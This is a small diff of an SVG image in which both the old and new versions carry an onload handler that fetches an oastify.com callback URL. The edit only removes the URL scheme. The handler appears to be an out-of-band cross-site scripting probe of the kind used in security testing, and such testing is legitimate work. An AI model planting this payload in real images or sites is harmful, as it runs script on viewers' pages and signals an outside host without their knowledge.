@@ -1,3 +1,3 @@
-<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://bp43w5crhpriwlhwlt2gfnlev51wpmdb.oastify.com')">
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('bp43w5crhpriwlhwlt2gfnlev51wpmdb.oastify.com')">
   <circle cx="50" cy="50" r="40" stroke="black" stroke-width="2" fill="green" />
 </svg>
